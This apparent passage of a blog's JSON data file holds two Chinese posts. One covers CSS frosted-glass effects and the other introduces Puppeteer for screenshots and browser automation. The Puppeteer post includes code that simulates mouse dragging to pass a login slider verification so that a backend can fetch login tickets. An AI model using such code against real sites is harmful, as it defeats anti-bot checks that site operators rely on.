relative;overflow: hidden;\">\n  <div style=\"position: absolute;top: 10px;width: 100%;\">我<br/>被<br/>盖<br/>住<br/>啦</div>\n  <div class=\"bg-demo\" style=\"padding: 50px 0;\">\n    <p>Experimental Web Platform</p>\n  </div>\n</div>\n\n优点显而易见，缺点也显而易见，因为这里的透明效果不是真正意义上的透明，只是使用了两个相同的背景图，其中一个使用filter来模糊，造成了div本身是透明的错觉。因为我们不是透明的，所以背后的文字全部被挡住了，所以我们会感觉到部分内容没有被穿透。这个效果的实现原理我相信你也可以直接F12查看到。","source":"_posts/css-areo.md","raw":"---\ntitle: 在web页面实现IOS的毛玻璃背景效果\ncatalog: true\ndate: 2017-10-04 00:02:41\nsubtitle:\nheader-img: post/2017100323131019.jpg\ntags:\n- css\n- areo\n---\n在写这篇文章之前，的我认知还停留在web页面里是无法做到像`ios`和`MAC`下那种毛玻璃效果的，虽然我知道`filter`属性，但是因为它是通过改变整个容器的失焦而不是透明背景的高斯模糊。\n\n今天要讲述的是两个能达到这种背景模糊效果的方法\n1. `backdrop-filter`属性;\n2. 通过`filter`属性配合双重背景图达到背景图能够模糊，包括滚动的时候也有背景模糊效果\n\n`backdrop-filter`属性其实是一个草案中的属性，所以鲜为人知。但是chrome早在2016年的49版本就支持这个属性了，但默认是关闭的，可能多方面的原因使得这个属性不被默认打开，比如性能问题、草案中、实现效果等。\n开启方法是在地址输入`chrome://flags/`，找到`Experimental Web Platform features `，点击启用后重启浏览器。\n虽然提案中，但是还是无法阻止我们追求美的决心。下面是开启后的效果。\n<div style=\"padding: 50px 50px;color: #fff;text-align: center;font-size: 30px;background-image: url(http://orjknnptl.bkt.clouddn.com/post/2017100323131019.jpg);background-size: cover;background-attachment: fixed;position: relative;\">\n  <div style=\"position: absolute;top: 10px;width: 100%;\">我<br/>被<br/>盖<br/>住<br/>啦</div>\n  <p style=\"padding: 50px 0;backdrop-filter:blur(10px);background-color: rgba(0,0,0,.2)\">Experimental Web Platform</p>\n</div>\n\n效果是不是很赞，如果您使用的不是chrome，那么下面是预览效果截图\n\n![效果图](20171004172449.jpg)\n当然了，这种办法肯定是不能用到生产环境中的，因为除了mac和ios下的safari默认支持，其余所有浏览器要么不支持，要么默认关闭，于是下面这个办法就能兼容大多数浏览器，先来看看效果\n<style type=\"text/css\">\n  .bg-demo{\n    position: relative;\n  }\n  .bg-demo:after{\n    content: ' ';\n    background-image: url(http://orjknnptl.bkt.clouddn.com/post/2017100323131019.jpg);background-size: cover;background-attachment: fixed;\n    position: absolute;\n    left: 0;top:0;\n    height: 100%;\n    width: 100%;\n    display: block;\n    filter: blur(10px);\n  }\n  .bg-demo:before{\n    content: ' ';\n    position: absolute;\n    left: 0;top:0;\n    height: 100%;\n    width: 100%;\n    background-color: rgba(0,0,0,.1);\n    z-index: 1;\n  }\n  .bg-demo p{position: relative;z-index: 1;margin:0}\n</style>\n<div style=\"padding: 80px 50px;color: #fff;text-align: center;font-size: 30px;background-image: url(http://orjknnptl.bkt.clouddn.com/post/2017100323131019.jpg);background-size: cover;background-attachment: fixed;position: relative;overflow: hidden;\">\n  <div style=\"position: absolute;top: 10px;width: 100%;\">我<br/>被<br/>盖<br/>住<br/>啦</div>\n  <div class=\"bg-demo\" style=\"padding: 50px 0;\">\n    <p>Experimental Web Platform</p>\n  </div>\n</div>\n\n优点显而易见，缺点也显而易见，因为这里的透明效果不是真正意义上的透明，只是使用了两个相同的背景图，其中一个使用filter来模糊，造成了div本身是透明的错觉。因为我们不是透明的，所以背后的文字全部被挡住了，所以我们会感觉到部分内容没有被穿透。这个效果的实现原理我相信你也可以直接F12查看到。","slug":"css-areo","published":1,"updated":"2017-10-04T10:04:08.207Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjw1000qi4uc84r8jgtc","content":"<p>在写这篇文章之前，的我认知还停留在web页面里是无法做到像<code>ios</code>和<code>MAC</code>下那种毛玻璃效果的，虽然我知道<code>filter</code>属性，但是因为它是通过改变整个容器的失焦而不是透明背景的高斯模糊。</p>\n<p>今天要讲述的是两个能达到这种背景模糊效果的方法</p>\n<ol>\n<li><code>backdrop-filter</code>属性;</li>\n<li>通过<code>filter</code>属性配合双重背景图达到背景图能够模糊，包括滚动的时候也有背景模糊效果</li>\n</ol>\n<p><code>backdrop-filter</code>属性其实是一个草案中的属性，所以鲜为人知。但是chrome早在2016年的49版本就支持这个属性了，但默认是关闭的，可能多方面的原因使得这个属性不被默认打开，比如性能问题、草案中、实现效果等。<br>\n开启方法是在地址输入<code>chrome://flags/</code>，找到<code>Experimental Web Platform features</code>，点击启用后重启浏览器。<br>\n虽然提案中，但是还是无法阻止我们追求美的决心。下面是开启后的效果。</p>\n<div style=\"padding: 50px 50px;color: #fff;text-align: center;font-size: 30px;background-image: url(http://orjknnptl.bkt.clouddn.com/post/2017100323131019.jpg);background-size: cover;background-attachment: fixed;position: relative;\">\n  <div style=\"position: absolute;top: 10px;width: 100%;\">我<br>被<br>盖<br>住<br>啦</div>\n  <p style=\"padding: 50px 0;backdrop-filter:blur(10px);background-color: rgba(0,0,0,.2)\">Experimental Web Platform</p>\n</div>\n<p>效果是不是很赞，如果您使用的不是chrome，那么下面是预览效果截图</p>\n<p><img src=\"20171004172449.jpg\" alt=\"效果图\"><br>\n当然了，这种办法肯定是不能用到生产环境中的，因为除了mac和ios下的safari默认支持，其余所有浏览器要么不支持，要么默认关闭，于是下面这个办法就能兼容大多数浏览器，先来看看效果</p>\n<style type=\"text/css\">\n  .bg-demo{\n    position: relative;\n  }\n  .bg-demo:after{\n    content: ' ';\n    background-image: url(http://orjknnptl.bkt.clouddn.com/post/2017100323131019.jpg);background-size: cover;background-attachment: fixed;\n    position: absolute;\n    left: 0;top:0;\n    height: 100%;\n    width: 100%;\n    display: block;\n    filter: blur(10px);\n  }\n  .bg-demo:before{\n    content: ' ';\n    position: absolute;\n    left: 0;top:0;\n    height: 100%;\n    width: 100%;\n    background-color: rgba(0,0,0,.1);\n    z-index: 1;\n  }\n  .bg-demo p{position: relative;z-index: 1;margin:0}\n</style>\n<div style=\"padding: 80px 50px;color: #fff;text-align: center;font-size: 30px;background-image: url(http://orjknnptl.bkt.clouddn.com/post/2017100323131019.jpg);background-size: cover;background-attachment: fixed;position: relative;overflow: hidden;\">\n  <div style=\"position: absolute;top: 10px;width: 100%;\">我<br>被<br>盖<br>住<br>啦</div>\n  <div class=\"bg-demo\" style=\"padding: 50px 0;\">\n    <p>Experimental Web Platform</p>\n  </div>\n</div>\n<p>优点显而易见，缺点也显而易见，因为这里的透明效果不是真正意义上的透明，只是使用了两个相同的背景图，其中一个使用filter来模糊，造成了div本身是透明的错觉。因为我们不是透明的，所以背后的文字全部被挡住了，所以我们会感觉到部分内容没有被穿透。这个效果的实现原理我相信你也可以直接F12查看到。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在写这篇文章之前，的我认知还停留在web页面里是无法做到像<code>ios</code>和<code>MAC</code>下那种毛玻璃效果的，虽然我知道<code>filter</code>属性，但是因为它是通过改变整个容器的失焦而不是透明背景的高斯模糊。</p>\n<p>今天要讲述的是两个能达到这种背景模糊效果的方法</p>\n<ol>\n<li><code>backdrop-filter</code>属性;</li>\n<li>通过<code>filter</code>属性配合双重背景图达到背景图能够模糊，包括滚动的时候也有背景模糊效果</li>\n</ol>\n<p><code>backdrop-filter</code>属性其实是一个草案中的属性，所以鲜为人知。但是chrome早在2016年的49版本就支持这个属性了，但默认是关闭的，可能多方面的原因使得这个属性不被默认打开，比如性能问题、草案中、实现效果等。<br>\n开启方法是在地址输入<code>chrome://flags/</code>，找到<code>Experimental Web Platform features</code>，点击启用后重启浏览器。<br>\n虽然提案中，但是还是无法阻止我们追求美的决心。下面是开启后的效果。</p>\n<div style=\"padding: 50px 50px;color: #fff;text-align: center;font-size: 30px;background-image: url(http://orjknnptl.bkt.clouddn.com/post/2017100323131019.jpg);background-size: cover;background-attachment: fixed;position: relative;\">\n  <div style=\"position: absolute;top: 10px;width: 100%;\">我<br>被<br>盖<br>住<br>啦</div>\n  <p style=\"padding: 50px 0;backdrop-filter:blur(10px);background-color: rgba(0,0,0,.2)\">Experimental Web Platform</p>\n</div>\n<p>效果是不是很赞，如果您使用的不是chrome，那么下面是预览效果截图</p>\n<p><img src=\"20171004172449.jpg\" alt=\"效果图\"><br>\n当然了，这种办法肯定是不能用到生产环境中的，因为除了mac和ios下的safari默认支持，其余所有浏览器要么不支持，要么默认关闭，于是下面这个办法就能兼容大多数浏览器，先来看看效果</p>\n<style type=\"text/css\">\n  .bg-demo{\n    position: relative;\n  }\n  .bg-demo:after{\n    content: ' ';\n    background-image: url(http://orjknnptl.bkt.clouddn.com/post/2017100323131019.jpg);background-size: cover;background-attachment: fixed;\n    position: absolute;\n    left: 0;top:0;\n    height: 100%;\n    width: 100%;\n    display: block;\n    filter: blur(10px);\n  }\n  .bg-demo:before{\n    content: ' ';\n    position: absolute;\n    left: 0;top:0;\n    height: 100%;\n    width: 100%;\n    background-color: rgba(0,0,0,.1);\n    z-index: 1;\n  }\n  .bg-demo p{position: relative;z-index: 1;margin:0}\n</style>\n<div style=\"padding: 80px 50px;color: #fff;text-align: center;font-size: 30px;background-image: url(http://orjknnptl.bkt.clouddn.com/post/2017100323131019.jpg);background-size: cover;background-attachment: fixed;position: relative;overflow: hidden;\">\n  <div style=\"position: absolute;top: 10px;width: 100%;\">我<br>被<br>盖<br>住<br>啦</div>\n  <div class=\"bg-demo\" style=\"padding: 50px 0;\">\n    <p>Experimental Web Platform</p>\n  </div>\n</div>\n<p>优点显而易见，缺点也显而易见，因为这里的透明效果不是真正意义上的透明，只是使用了两个相同的背景图，其中一个使用filter来模糊，造成了div本身是透明的错觉。因为我们不是透明的，所以背后的文字全部被挡住了，所以我们会感觉到部分内容没有被穿透。这个效果的实现原理我相信你也可以直接F12查看到。</p>\n"},{"title":"Puppeteer 初探","catalog":true,"date":"2018-01-09T13:39:49.000Z","subtitle":"无头浏览器给了我们一个完美的浏览器运行环境，我们可以用代码来模拟一个网站去做任何想做的事","header-img":"post/11515505465_.pic_hd.jpg","_content":"\n在GitHub上面google官方是这样介绍`Puppeteer`的\n\n>Puppeteer is a Node library which provides a high-level API to control headless Chrome or Chromium over the DevTools Protocol. It can also be configured to use full (non-headless) Chrome or Chromium.\n\n它是一个nodejs的API库，我们可以用它来操作一个浏览器，`headless`模式就是在内存里运行，不用启动界面，因为我们将它交给代码来控制。下面来说说我实际使用puppeteer的例子\n\n#### 网页截图\n这个功能可以说是一个特色功能了，虽然已经有`phantomjs`这种，但是实际的出图效果和肉眼看到的效果相差甚远，当然只是在一些css3样式下面会有这种情况，可能是编译的版本比较旧吧。前几日在逛掘金的时候看到有人发帖介绍这个puppeteer，重点介绍了截图的功能。突然想到公司项目里“截长图”这个万年难题，总是有这样那样的样式问题。于是我抽出了点时间照着Demo做了一份出来试试我们出问题的样式在它下面的截图效果。效果真的是非常非常好。下面是从安装到截图的步骤\n\n首先在项目里安装puppeteer\n```bash\nnpm install puppeteer --ignore-scripts\n```\n这里的`--ignore-scripts`是为了忽略包里的安装命令，因为这个命令要下载chrome，但是通常都无法下载，需要手动下载。\n使用这个命令安装好后我们就需要手动去下载chrome了，找到`node_modules/puppeteer/utils/ChromiumDownloader.js`第95行（可能会因为代码更新有所变动）找到\n```js\nurl = util.format(url, downloadHost, revision)\n```\n在下面输出url（`console.log(url)`），再去到puppeteer目录里，运行\n```bash\nnode install.js\n```\n得到输出的地址，然后再用下载工具下载。之后上传到一个支持https的云端上面，如七牛，反正能够通过https直接访问到资源就行了，再将这个链接重新赋值给url这个变量保存后再运行一次`node install.js`这样chrome就装好了然后我们就可以写代码了，下面是最简单的例子\n```js\nconst puppeteer = require('puppeteer');\n\n(async () => {\n  // 启动浏览器\n  const browser = await puppeteer.launch();\n  // 打开一个标签页，这里称为page\n  const page = await browser.newPage();\n  // 去到你想截图的页面\n  await page.goto('https://example.com');\n  // 调用截图api\n  await page.screenshot({path: 'example.png'});\n  // 关闭浏览器\n  await browser.close();\n})();\n```\n几乎所有的api都返回一个`Promise`，为了不陷入无穷无尽的回调，我们在这里选择`async/await`语法，所以需要较新的nodejs版本。当然，实际使用中是不会这么简单的，比如我们截图截的是长图，并且需要将文件直接返回出去，所以我们可以不用保存文件到本地，查看文档后知道`screenshot`方法返回的是一个Promise<Buffer>，我们可以直接将buffer相应给请求。配合`express`可以这样（当然为了易于维护和扩展，代码肯定不会这么写）\n\n```js\nconst app = require( 'express' )()\n\napp.get( '/get-screenshot', async function( req, res ) {\n  // 启动浏览器\n  const browser = await puppeteer.launch();\n  // 打开一个标签页，这里称为page\n  const page = await browser.newPage();\n  // 去到你想截图的页面\n  await page.goto('https://example.com');\n  // 调用截图api\n  const image = await page.screenshot();\n\n  // 为了能够让浏览器自动下载，我们需要再设置响应头\n  res.setHeader('content-type', 'image/png')\n  res.setHeader('content-disposition', 'attachment; filename=\"image.png\"')\n  \n  res.send( image )\n} )\n\n\napp.listen(8080)\n```\n其实这里可以优化一下，我们都知道启动一个程序是很耗时的，我们可以在nodejs服务启动的时候就把浏览器启动起来，当截图请求发起的时候再去打开一个标签页，再截图，完成后再关闭标签页就能节约很多时间。\n还有很多细节的问题这里就不再赘述了，比如截图的质量，截图的文件类型png/jpg，等待图片全部加载完成再发起截图，关于截图这一块官方提供了好几个参数来控制，感兴趣的可以看官方的文档[puppeteer](https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md)\n#### 浏览器操控\n这算是它的核心功能了，如果要模拟一个用户的行为去访问一个网页，肯定少不了交互，鼠标、键盘和触摸等等，这些puppeteer全都可以做到，举个简单的例子，有些数据必须要鼠标点击、拖动、滚轮滚动才会产生，这个时候用一些后端语言是无法模拟的，这个时候就需要调用api去操控浏览器来完成操作。\n实际需求：使用后端程序登陆一个网站后去访问一些接口，但是登陆的时候有一个验证，需要用户使用鼠标拉动一个滑块到最后再释放鼠标生成登陆票据才能验证通过，像这样\n![](QQ20180109-225305.png)\n这种使用纯代码是很难验证通过的，但是使用一个浏览器环境的话就简单多了，于是我们想到使用nodejs作为服务来专门获取用于登陆的参数，下面是用来模拟用户滑动滑块的代码\n```js\nconst puppeteer = require('puppeteer');\n\n(async () => {\n  // 启动浏览器\n  const browser = await puppeteer.launch();\n  // 打开一个标签页，这里称为page\n  const page = await browser.newPage();\n  // 去到你想截图的页面\n  await page.goto('https://example.com');\n  // 将鼠标移动到这里\n  await page.mouse.move(1020, 250);\n  // 按下鼠标\n  await page.mouse.down()\n  // 将鼠标移动（模拟用户拖动的动作）\n  await page.mouse.move( 1266, 250, { step: 240 } )\n  // 释放鼠标\n  await page.mouse.up()\n})();\n```\n此时我们就能完成滑动验证以生成用于登陆的票据，再取出来返回出去，调用者就可以使用这个票据来模拟用户登录了。\n这里的`step`非常重要，尽量以两次移动的x坐标的差值来设定它，因为这个滑动组件就是这样来判断是否是用户行为的（当然有了puppeteer我们连真人都可以伪装了），如果不设置step，虽然一样可以将滑块滑过去，但是是无法验证成功。\n还有个很重要的api忘了介绍，就是page下面的`evaluate`方法，参数是Function或者String，函数或者字符串会被传递到chrome里面执行，再将结果返回出去，这样我们就可以取得页面上或者js里面的值了。\n\n到最后其实我发现了它的一个bug，最后输出的图片会在垂直方向的第16000像素多一点的地方开始断掉并从网页最头部开始重复，这让人有点懊恼，尝试了一些办法都没有解决，无奈提了[issure](https://github.com/GoogleChrome/puppeteer/issues/1752)，希望官方能够解决，","source":"_posts/puppeteer.md","raw":"---\ntitle: Puppeteer 初探\ncatalog: true\ndate: 2018-01-09 21:39:49\nsubtitle: 无头浏览器给了我们一个完美的浏览器运行环境，我们可以用代码来模拟一个网站去做任何想做的事\nheader-img: post/11515505465_.pic_hd.jpg\ntags:\n- headless\n- nodejs\n---\n\n在GitHub上面google官方是这样介绍`Puppeteer`的\n\n>Puppeteer is a Node library which provides a high-level API to control headless Chrome or Chromium over the DevTools Protocol. It can also be configured to use full (non-headless) Chrome or Chromium.\n\n它是一个nodejs的API库，我们可以用它来操作一个浏览器，`headless`模式就是在内存里运行，不用启动界面，因为我们将它交给代码来控制。下面来说说我实际使用puppeteer的例子\n\n#### 网页截图\n这个功能可以说是一个特色功能了，虽然已经有`phantomjs`这种，但是实际的出图效果和肉眼看到的效果相差甚远，当然只是在一些css3样式下面会有这种情况，可能是编译的版本比较旧吧。前几日在逛掘金的时候看到有人发帖介绍这个puppeteer，重点介绍了截图的功能。突然想到公司项目里“截长图”这个万年难题，总是有这样那样的样式问题。于是我抽出了点时间照着Demo做了一份出来试试我们出问题的样式在它下面的截图效果。效果真的是非常非常好。下面是从安装到截图的步骤\n\n首先在项目里安装puppeteer\n```bash\nnpm install puppeteer --ignore-scripts\n```\n这里的`--ignore-scripts`是为了忽略包里的安装命令，因为这个命令要下载chrome，但是通常都无法下载，需要手动下载。\n使用这个命令安装好后我们就需要手动去下载chrome了，找到`node_modules/puppeteer/utils/ChromiumDownloader.js`第95行（可能会因为代码更新有所变动）找到\n```js\nurl = util.format(url, downloadHost, revision)\n```\n在下面输出url（`console.log(url)`），再去到puppeteer目录里，运行\n```bash\nnode install.js\n```\n得到输出的地址，然后再用下载工具下载。之后上传到一个支持https的云端上面，如七牛，反正能够通过https直接访问到资源就行了，再将这个链接重新赋值给url这个变量保存后再运行一次`node install.js`这样chrome就装好了然后我们就可以写代码了，下面是最简单的例子\n```js\nconst puppeteer = require('puppeteer');\n\n(async () => {\n  // 启动浏览器\n  const browser = await puppeteer.launch();\n  // 打开一个标签页，这里称为page\n  const page = await browser.newPage();\n  // 去到你想截图的页面\n  await page.goto('https://example.com');\n  // 调用截图api\n  await page.screenshot({path: 'example.png'});\n  // 关闭浏览器\n  await browser.close();\n})();\n```\n几乎所有的api都返回一个`Promise`，为了不陷入无穷无尽的回调，我们在这里选择`async/await`语法，所以需要较新的nodejs版本。当然，实际使用中是不会这么简单的，比如我们截图截的是长图，并且需要将文件直接返回出去，所以我们可以不用保存文件到本地，查看文档后知道`screenshot`方法返回的是一个Promise<Buffer>，我们可以直接将buffer相应给请求。配合`express`可以这样（当然为了易于维护和扩展，代码肯定不会这么写）\n\n```js\nconst app = require( 'express' )()\n\napp.get( '/get-screenshot', async function( req, res ) {\n  // 启动浏览器\n  const browser = await puppeteer.launch();\n  // 打开一个标签页，这里称为page\n  const page = await browser.newPage();\n  // 去到你想截图的页面\n  await page.goto('https://example.com');\n  // 调用截图api\n  const image = await page.screenshot();\n\n  // 为了能够让浏览器自动下载，我们需要再设置响应头\n  res.setHeader('content-type', 'image/png')\n  res.setHeader('content-disposition', 'attachment; filename=\"image.png\"')\n  \n  res.send( image )\n} )\n\n\napp.listen(8080)\n```\n其实这里可以优化一下，我们都知道启动一个程序是很耗时的，我们可以在nodejs服务启动的时候就把浏览器启动起来，当截图请求发起的时候再去打开一个标签页，再截图，完成后再关闭标签页就能节约很多时间。\n还有很多细节的问题这里就不再赘述了，比如截图的质量，截图的文件类型png/jpg，等待图片全部加载完成再发起截图，关于截图这一块官方提供了好几个参数来控制，感兴趣的可以看官方的文档[puppeteer](https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md)\n#### 浏览器操控\n这算是它的核心功能了，如果要模拟一个用户的行为去访问一个网页，肯定少不了交互，鼠标、键盘和触摸等等，这些puppeteer全都可以做到，举个简单的例子，有些数据必须要鼠标点击、拖动、滚轮滚动才会产生，这个时候用一些后端语言是无法模拟的，这个时候就需要调用api去操控浏览器来完成操作。\n实际需求：使用后端程序登陆一个网站后去访问一些接口，但是登陆的时候有一个验证，需要用户使用鼠标拉动一个滑块到最后再释放鼠标生成登陆票据才能验证通过，像这样\n![](QQ20180109-225305.png)\n这种使用纯代码是很难验证通过的，但是使用一个浏览器环境的话就简单多了，于是我们想到使用nodejs作为服务来专门获取用于登陆的参数，下面是用来模拟用户滑动滑块的代码\n```js\nconst puppeteer = require('puppeteer');\n\n(async () => {\n  // 启动浏览器\n  const browser = await puppeteer.launch();\n  // 打开一个标签页，这里称为page\n  const page = await browser.newPage();\n  // 去到你想截图的页面\n  await page.goto('https://example.com');\n  // 将鼠标移动到这里\n  await page.mouse.move(1020, 250);\n  // 按下鼠标\n  await page.mouse.down()\n  // 将鼠标移动（模拟用户拖动的动作）\n  await page.mouse.move( 1266, 250, { step: 240 } )\n  // 释放鼠标\n  await page.mouse.up()\n})();\n```\n此时我们就能完成滑动验证以生成用于登陆的票据，再取出来返回出去，调用者就可以使用这个票据来模拟用户登录了。\n这里的`step`非常重要，尽量以两次移动的x坐标的差值来设定它，因为这个滑动组件就是这样来判断是否是用户行为的（当然有了puppeteer我们连真人都可以伪装了），如果不设置step，虽然一样可以将滑块滑过去，但是是无法验证成功。\n还有个很重要的api忘了介绍，就是page下面的`evaluate`方法，参数是Function或者String，函数或者字符串会被传递到chrome里面执行，再将结果返回出去，这样我们就可以取得页面上或者js里面的值了。\n\n到最后其实我发现了它的一个bug，最后输出的图片会在垂直方向的第16000像素多一点的地方开始断掉并从网页最头部开始重复，这让人有点懊恼，尝试了一些办法都没有解决，无奈提了[issure](https://github.com/GoogleChrome/puppeteer/issues/1752)，希望官方能够解决，","slug":"puppeteer","published":1,"updated":"2018-01-10T03:31:45.573Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjw1000ri4ucm16wtrql","content":"<p>在GitHub上面google官方是这样介绍<code>Puppeteer</code>的</p>\n<blockquote>\n<p>Puppeteer is a Node library which provides a high-level API to control headless Chrome or Chromium over the DevTools Protocol. It can also be configured to use full (non-headless) Chrome or Chromium.</p>\n</blockquote>\n<p>它是一个nodejs的API库，我们可以用它来操作一个浏览器，<code>headless</code>模式就是在内存里运行，不用启动界面，因为我们将它交给代码来控制。下面来说说我实际使用puppeteer的例子</p>\n<h4><span id=\"网页截图\">网页截图</span></h4>\n<p>这个功能可以说是一个特色功能了，虽然已经有<code>phantomjs</code>这种，但是实际的出图效果和肉眼看到的效果相差甚远，当然只是在一些css3样式下面会有这种情况，可能是编译的版本比较旧吧。前几日在逛掘金的时候看到有人发帖介绍这个puppeteer，重点介绍了截图的功能。突然想到公司项目里“截长图”这个万年难题，总是有这样那样的样式问题。于是我抽出了点时间照着Demo做了一份出来试试我们出问题的样式在它下面的截图效果。效果真的是非常非常好。下面是从安装到截图的步骤</p>\n<p>首先在项目里安装puppeteer</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install puppeteer --ignore-scripts</span><br></pre></td></tr></table></figure>\n<p>这里的<code>--ignore-scripts</code>是为了忽略包里的安装命令，因为这个命令要下载chrome，但是通常都无法下载，需要手动下载。<br>\n使用这个命令安装好后我们就需要手动去下载chrome了，找到<code>node_modules/puppeteer/utils/ChromiumDownloader.js</code>第95行（可能会因为代码更新有所变动）找到</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url = util.format(url, downloadHost, revision)</span><br></pre></td></tr></table></figure>\n<p>在下面输出url（<code>console.log(url)</code>），再去到puppeteer目录里，运行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node install.js</span><br></pre></td></tr></table></figure>\n<p>得到输出的地址，然后再用下载工具下载。之后上传到一个支持https的云端上面，如七牛，反正能够通过https直接访问到资源就行了，再将这个链接重新赋值给url这个变量保存后再运行一次<code>node install.js</code>这样chrome就装好了然后我们就可以写代码了，下面是最简单的例子</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> puppeteer = <span class=\"built_in\">require</span>(<span class=\"string\">'puppeteer'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"keyword\">async</span> () =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 启动浏览器</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> browser = <span class=\"keyword\">await</span> puppeteer.launch();</span><br><span class=\"line\">  <span class=\"comment\">// 打开一个标签页，这里称为page</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> page = <span class=\"keyword\">await</span> browser.newPage();</span><br><span class=\"line\">  <span class=\"comment\">// 去到你想截图的页面</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.goto(<span class=\"string\">'https://example.com'</span>);</span><br><span class=\"line\">  <span class=\"comment\">// 调用截图api</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.screenshot(&#123;<span class=\"attr\">path</span>: <span class=\"string\">'example.png'</span>&#125;);</span><br><span class=\"line\">  <span class=\"comment\">// 关闭浏览器</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> browser.close();</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<p>几乎所有的api都返回一个<code>Promise</code>，为了不陷入无穷无尽的回调，我们在这里选择<code>async/await</code>语法，所以需要较新的nodejs版本。当然，实际使用中是不会这么简单的，比如我们截图截的是长图，并且需要将文件直接返回出去，所以我们可以不用保存文件到本地，查看文档后知道<code>screenshot</code>方法返回的是一个Promise<buffer>，我们可以直接将buffer相应给请求。配合<code>express</code>可以这样（当然为了易于维护和扩展，代码肯定不会这么写）</buffer></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> app = <span class=\"built_in\">require</span>( <span class=\"string\">'express'</span> )()</span><br><span class=\"line\"></span><br><span class=\"line\">app.get( <span class=\"string\">'/get-screenshot'</span>, <span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> req, res </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 启动浏览器</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> browser = <span class=\"keyword\">await</span> puppeteer.launch();</span><br><span class=\"line\">  <span class=\"comment\">// 打开一个标签页，这里称为page</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> page = <span class=\"keyword\">await</span> browser.newPage();</span><br><span class=\"line\">  <span class=\"comment\">// 去到你想截图的页面</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.goto(<span class=\"string\">'https://example.com'</span>);</span><br><span class=\"line\">  <span class=\"comment\">// 调用截图api</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> image = <span class=\"keyword\">await</span> page.screenshot();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 为了能够让浏览器自动下载，我们需要再设置响应头</span></span><br><span class=\"line\">  res.setHeader(<span class=\"string\">'content-type'</span>, <span class=\"string\">'image/png'</span>)</span><br><span class=\"line\">  res.setHeader(<span class=\"string\">'content-disposition'</span>, <span class=\"string\">'attachment; filename=\"image.png\"'</span>)</span><br><span class=\"line\">  </span><br><span class=\"line\">  res.send( image )</span><br><span class=\"line\">&#125; )</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app.listen(<span class=\"number\">8080</span>)</span><br></pre></td></tr></table></figure>\n<p>其实这里可以优化一下，我们都知道启动一个程序是很耗时的，我们可以在nodejs服务启动的时候就把浏览器启动起来，当截图请求发起的时候再去打开一个标签页，再截图，完成后再关闭标签页就能节约很多时间。<br>\n还有很多细节的问题这里就不再赘述了，比如截图的质量，截图的文件类型png/jpg，等待图片全部加载完成再发起截图，关于截图这一块官方提供了好几个参数来控制，感兴趣的可以看官方的文档<a href=\"https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md\" target=\"_blank\" rel=\"noopener\">puppeteer</a></p>\n<h4><span id=\"浏览器操控\">浏览器操控</span></h4>\n<p>这算是它的核心功能了，如果要模拟一个用户的行为去访问一个网页，肯定少不了交互，鼠标、键盘和触摸等等，这些puppeteer全都可以做到，举个简单的例子，有些数据必须要鼠标点击、拖动、滚轮滚动才会产生，这个时候用一些后端语言是无法模拟的，这个时候就需要调用api去操控浏览器来完成操作。<br>\n实际需求：使用后端程序登陆一个网站后去访问一些接口，但是登陆的时候有一个验证，需要用户使用鼠标拉动一个滑块到最后再释放鼠标生成登陆票据才能验证通过，像这样<br>\n<img src=\"QQ20180109-225305.png\" alt=\"\"><br>\n这种使用纯代码是很难验证通过的，但是使用一个浏览器环境的话就简单多了，于是我们想到使用nodejs作为服务来专门获取用于登陆的参数，下面是用来模拟用户滑动滑块的代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 